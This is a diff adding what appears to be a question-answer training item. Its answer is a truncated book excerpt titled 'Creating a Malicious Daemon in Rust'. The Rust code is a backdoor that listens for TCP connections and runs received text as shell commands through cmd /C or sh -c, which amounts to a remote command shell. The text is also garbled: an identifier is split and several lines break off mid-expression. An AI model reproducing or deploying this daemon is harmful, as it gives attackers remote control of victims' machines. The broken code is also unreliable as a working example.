@@ -1,0 +1,33 @@
+TECHNIQUE / QUESTION:
+Explain the purpose, syntax, and usage of the code/command in the following text: (Context: from Document)
+
+CONTEXT:
+Source: Unknown
+Section: General
+Pages: N/A
+
+METHOD / ANSWER:
+making it a good choice for both legitimate and malicious software
+development.
+Example 6-18 Creating a Malicious Daemon in Rust
+use std::net::{TcpListener, TcpStr eam};
+use std::process::{Command, Stdio};
+use std::io::{Read, Write};
+use std::thread;
+fn handle_client(mut stream: TcpStream) {
+let mut buffer = [0; 1024];
+loop {
+match stream.read(&mut buffer) {
+Ok(0) => break, // Connection closed
+Ok(_) => {
+let cmd = String::from_utf8_lossy(&buffer
+let output = if cfg!(target_os = "windows
+Command::new("cmd")
+.arg("/C")
+.arg(cmd.trim())
+.output()
+.expect("Failed to execute command"
+} else {
+Command::new("sh")
+.arg("-c")
+.arg(cmd.trim())
